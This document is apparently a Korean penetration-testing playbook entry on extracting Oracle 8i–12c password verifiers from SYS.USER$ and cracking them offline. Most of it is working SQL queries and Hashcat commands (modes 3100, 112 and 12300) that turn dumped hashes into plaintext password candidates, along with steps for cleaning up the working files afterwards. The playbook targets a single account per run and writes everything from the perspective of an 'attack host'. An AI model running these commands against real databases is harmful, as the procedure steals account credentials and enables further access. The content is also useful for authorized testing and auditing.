---
tags:
  - 서비스/oracle
시작조건: ["Oracle DB 인증 세션 확보", "8i~10g server release 또는 11g~12c account별 verifier version 확인"]
필요권한: ["대상 버전의 SYS.USER$ 내부 필드 직접 조회 권한", "11g~12c에서는 DBA_USERS 조회 권한"]
필요조건: ["Oracle 서버 버전", "대상 DB 사용자명", "8i~10g server release 또는 11g~12c PASSWORD_VERSIONS 결과", "8i~12c로 한정된 내부 필드 구현 근거"]
결과: ["10G·11G·12C verifier 원문", "Hashcat 형식의 오프라인 입력", "평문 비밀번호 후보"]
---

# Oracle password verifier 추출과 오프라인 입력 준비

## 한 줄 판단

Oracle 8i~12c DB 세션에서 서버 release와 `SYS.USER$` 직접 조회 권한을 확인하고, 11g~12c에서는 대상 계정의 verifier version까지 확인했다면 `10G`·`11G`·`12C` component를 각각 Hashcat 입력으로 직렬화해 오프라인 복구 결과를 별도 인증 후보로 만든다.

## 지원 경계

- Oracle이 지원하는 `DBA_USERS.PASSWORD_VERSIONS`는 계정에 저장된 verifier 종류를 보여 주지만 verifier 문자열 본문은 제공하지 않는다.
- `SYS.USER$.PASSWORD`와 `SPARE4`는 이 절차에서 사용하는 내부 필드이며 Oracle의 공개 data dictionary 계약이 아니다. 현재 명령은 교육 원천의 Oracle Database 11g XE 11.2.0.2.0 출력과 Rapid7 `oracle_hashdump` 공개 구현이 선언한 8i~12c 범위에만 한정한다.
- Rapid7 구현은 8i~10g에서 `PASSWORD`, 11g~12c에서 `SPARE4`를 조회하며 18c를 지원하지 않는다. 이는 공개 구현 범위이지 Oracle의 지원 보장이 아니다. 18c 이상에서는 내부 필드를 추정하지 않고 [[DB 인증과 데이터 열거]]의 metadata 확인까지만 유지한다.
- 같은 11g·12c 서버에서도 계정마다 여러 password version이 함께 남을 수 있다. `PASSWORD`가 16자리 16진수를 반환했다는 사실을 서버가 11g라는 이유로 `11G` verifier라고 부르지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 실행 위치 | Oracle listener에 도달하고 SQL*Plus를 실행할 수 있는 공격 호스트 | 현재 SQL*Plus session의 target·SID/service와 server banner 확인 | listener·SID/service·인증 문제를 먼저 해결 |
| 현재 DB identity | 현재 user·authenticated identity와 관리 권한이 확인됨 | `sys_context`, `SESSION_PRIVS` | 일반 DB 로그인만으로 `SYS.USER$` 조회 가능성을 추정하지 않음 |
| 대상 계정 version | 8i~10g는 server release, 11g~12c는 대상 사용자에 저장된 `10G`·`11G`·`12C` 조합 | `v$version`, 11g~12c의 `DBA_USERS.PASSWORD_VERSIONS` | 11g~12c에서 view가 거부되면 verifier 본문을 먼저 조회하지 않음 |
| 내부 필드 범위 | 서버가 8i~12c이고 direct `SYS.USER$` 조회가 가능함 | `v$version`, 최소 대상 사용자 query | 18c+·권한 거부·field 불일치는 미지원으로 유지 |
| 분석 경로 | 민감 verifier를 분리할 새 local directory | `mktemp -d`, `umask 077` | shared file·shell history에 verifier를 저장하지 않음 |

## 실행

`<TARGET_DB_USER>`는 version·권한 확인을 마친 대상 Oracle 사용자명(가상 예시 `APPUSER`)이고, `<PASSWORD_HEX>`·`<SPARE4_HEX>`는 해당 한 행 query에서 반환된 민감 hex field다. `<WORKDIR>`·`<HASH_FILE>`·`<POTFILE>`·`<WORDLIST>`는 공격 호스트의 새 분석 경로와 입력 목록이며, SQL은 Oracle session에서, 파일 직렬화·Hashcat은 공격 호스트 셸에서 실행한다.

### 1. 서버·session·계정별 version 확인

SQL*Plus prompt에서 실행한다. 서버 banner, client version과 계정별 verifier는 서로 다른 값이다.

```sql
select banner from v$version where banner like 'Oracle Database%';
select user,
       sys_context('USERENV', 'AUTHENTICATED_IDENTITY') as authenticated_identity,
       sys_context('USERENV', 'AUTHENTICATION_METHOD') as authentication_method
from dual;
select username, password_versions
from dba_users
where username = upper('<TARGET_DB_USER>');
```

확인할 출력:

- 실제 Oracle Database server release, 현재 session identity와 대상 계정의 `PASSWORD_VERSIONS`.
- `10G`는 이전 case-insensitive ORCL verifier, `11G`는 salted SHA-1, `12C`는 PBKDF2 기반 SHA-512 verifier다. 한 계정에 조합이 존재할 수 있다.
- `PASSWORD_VERSIONS` query는 11g~12c 경로에서 사용한다. 8i~10g처럼 column이 없는 release에서는 server version과 legacy `PASSWORD` field 범위만 적용한다.
- 11g~12c에서 `DBA_USERS` 행이 없거나 `ORA-01031`·`ORA-00942`이면 대상 이름·container와 view 조회 권한을 확인한다. verifier 미존재로 확정하지 않는다.

### 2. 대상 계정 하나의 내부 필드만 조회

8i~10g 공개 구현 범위에서는 `PASSWORD`를, 11g~12c에서는 계정별 `PASSWORD_VERSIONS`와 함께 `PASSWORD`·`SPARE4`를 확인한다. 전체 사용자 dump 대신 `<TARGET_DB_USER>` 한 행으로 제한한다.

```sql
select name, password
from sys.user$
where name = upper('<TARGET_DB_USER>') and password is not null;
```

11g~12c에서 `11G`·`12C` component가 필요한 경우에만 다음을 별도로 조회한다.

```sql
select name, spare4
from sys.user$
where name = upper('<TARGET_DB_USER>') and spare4 is not null;
```

확인할 출력:

- `PASSWORD_VERSIONS`에 `10G`가 있고 `PASSWORD`가 16자리 16진수이면 그 component를 legacy 10G/H type 후보로 다룬다.
- `PASSWORD_VERSIONS`에 `11G`가 있고 `SPARE4`에 `S:` 뒤 60자리 16진수 component가 있으면 앞 40자리는 digest, 뒤 20자리는 salt다.
- `PASSWORD_VERSIONS`에 `12C`가 있고 `SPARE4`에 `T:` 뒤 160자리 16진수 component가 있으면 그 160자리가 Hashcat T type 입력이다.
- `SPARE4`에 여러 `S:`·`H:`·`T:` component가 있으면 semicolon 단위로 분리하되, 해당 account의 `PASSWORD_VERSIONS`와 길이가 일치하는 component만 사용한다. 빈 값이나 다른 길이를 억지로 보정하지 않는다.
- `ORA-01031`·`ORA-00942` 또는 field 불일치는 권한·지원 범위 실패다. dictionary 권한을 추가하거나 DB 설정을 바꾸지 않고 중단한다.

### 3. Linux 분석 호스트에서 Hashcat 입력 직렬화

실제 verifier와 사용자명은 Vault에 기록하지 않는다. 새 작업 디렉터리에서 확인한 component 하나만 입력한다.

```bash
umask 077
ORACLE_WORKDIR=$(mktemp -d /tmp/oracle-verifier.XXXXXX)
printf 'workdir=%s\n' "$ORACLE_WORKDIR"
```

10G/H type은 `16_HEX:UPPERCASE_USERNAME` 형식이다.

```bash
ORACLE_10G_HEX='<16_HEX_PASSWORD_FIELD>'
ORACLE_DB_USER='<UPPERCASE_DB_USERNAME>'
[[ "$ORACLE_10G_HEX" =~ ^[[:xdigit:]]{16}$ ]] || exit 1
printf '%s:%s\n' "$ORACLE_10G_HEX" "$ORACLE_DB_USER" > "$ORACLE_WORKDIR/oracle-10g.hash"
hashcat -m 3100 -a 0 "$ORACLE_WORKDIR/oracle-10g.hash" '<WORDLIST>' --potfile-path "$ORACLE_WORKDIR/hashcat-3100.potfile" --restore-file-path "$ORACLE_WORKDIR/hashcat-3100.restore" -o "$ORACLE_WORKDIR/oracle-10g.recovered" --backend-ignore-opencl -d 1 -O -w 3
```

11G/S type은 `S:`를 제외한 60자리 component를 `40_HEX_DIGEST:20_HEX_SALT`로 나눈다.

```bash
ORACLE_S_HEX='<60_HEX_AFTER_S_PREFIX>'
[[ "$ORACLE_S_HEX" =~ ^[[:xdigit:]]{60}$ ]] || exit 1
printf '%s:%s\n' "${ORACLE_S_HEX:0:40}" "${ORACLE_S_HEX:40:20}" > "$ORACLE_WORKDIR/oracle-11g.hash"
hashcat -m 112 -a 0 "$ORACLE_WORKDIR/oracle-11g.hash" '<WORDLIST>' --potfile-path "$ORACLE_WORKDIR/hashcat-112.potfile" --restore-file-path "$ORACLE_WORKDIR/hashcat-112.restore" -o "$ORACLE_WORKDIR/oracle-11g.recovered" --backend-ignore-opencl -d 1 -O -w 3
```

12C/T type은 `T:`를 제외한 160자리 component를 그대로 사용한다.

```bash
ORACLE_T_HEX='<160_HEX_AFTER_T_PREFIX>'
[[ "$ORACLE_T_HEX" =~ ^[[:xdigit:]]{160}$ ]] || exit 1
printf '%s\n' "$ORACLE_T_HEX" > "$ORACLE_WORKDIR/oracle-12c.hash"
hashcat -m 12300 -a 0 "$ORACLE_WORKDIR/oracle-12c.hash" '<WORDLIST>' --potfile-path "$ORACLE_WORKDIR/hashcat-12300.potfile" --restore-file-path "$ORACLE_WORKDIR/hashcat-12300.restore" -o "$ORACLE_WORKDIR/oracle-12c.recovered" --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- Hashcat이 각각 `Oracle H: Type`, `Oracle S: Type`, `Oracle T: Type`으로 입력을 인식하는지 확인한다. `Token length exception`이면 raw field·prefix·component 분리·사용자명 위치를 다시 확인한다.
- `Recovered`는 해당 verifier의 평문 후보 복구다. Oracle session 인증, 계정 잠금 상태, 현재 password 또는 다른 서비스 재사용을 확정하지 않는다.
- Hashcat build에 mode가 없거나 `-O`가 거부되면 기대값을 바꾸지 말고 설치 build·mode 지원과 입력 길이를 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `PASSWORD_VERSIONS`만 확인 | verifier 종류 metadata만 확보 | raw verifier 미확보 | 지원 버전·권한이면 대상 한 행의 내부 field 조회, 아니면 현재 범위 유지 |
| 11g server의 `PASSWORD`에서 16자리 값 확인 | `10G` metadata와 함께일 때만 legacy verifier 후보 | 10G 오프라인 입력 후보 | username을 결합한 mode 3100 입력 검증 |
| `SPARE4`의 `S:` 또는 `T:` component와 metadata·길이 일치 | 11G 또는 12C raw verifier 확인 | 오프라인 cracking 입력 | component별 mode 112 또는 12300 실행 |
| 평문 후보 복구 | verifier와 일치하는 password 후보 | Oracle credential 후보 | [[원격 비밀번호 공격]]의 잠금 정책 범위에서 현재 인증을 별도 검증 |
| 18c+·field/권한 오류 | 이 내부 구현의 지원 범위 밖 | metadata만 확인 | 내부 field를 일반화하지 않고 보류 이유 기록 |

## 변경 영향과 정리

SQL query는 DB 계정·설정을 바꾸지 않지만 민감 verifier를 client 출력과 DB audit에 남길 수 있다. 분석 호스트에는 hash·potfile·restore·복구 평문이 생성되므로 분석이 끝나고 보존이 필요하지 않으면 이번 작업 디렉터리의 exact 파일만 정리한다.

```bash
rm -f -- "$ORACLE_WORKDIR/oracle-10g.hash" "$ORACLE_WORKDIR/oracle-11g.hash" "$ORACLE_WORKDIR/oracle-12c.hash"
rm -f -- "$ORACLE_WORKDIR/hashcat-3100.potfile" "$ORACLE_WORKDIR/hashcat-3100.restore" "$ORACLE_WORKDIR/oracle-10g.recovered"
rm -f -- "$ORACLE_WORKDIR/hashcat-112.potfile" "$ORACLE_WORKDIR/hashcat-112.restore" "$ORACLE_WORKDIR/oracle-11g.recovered"
rm -f -- "$ORACLE_WORKDIR/hashcat-12300.potfile" "$ORACLE_WORKDIR/hashcat-12300.restore" "$ORACLE_WORKDIR/oracle-12c.recovered"
rmdir -- "$ORACLE_WORKDIR"
test ! -e "$ORACLE_WORKDIR"
```

shared Hashcat cache나 SQL client spool에 verifier가 남았다면 전체 정리 완료로 기록하지 않는다. DB audit·client history는 대상 데이터를 삭제하지 않고 잔여 영향으로 보고한다.

## 관련 서비스

- [[Oracle TNS 서비스]]

## 관련 도구

- [[sqlplus]]
- [[hashcat]]

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 참고 링크

- [Oracle Database 19c — Database Authentication of Users](https://docs.oracle.com/en/database/oracle/oracle-database/19/dbseg/database-authentication-users1.html)
- [Oracle Database 19c — DBA_USERS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/DBA_USERS.html)
- [Rapid7 Metasploit oracle_hashdump implementation](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/oracle/oracle_hashdump.rb)
- [Hashcat example hashes](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-example-hashes.md)
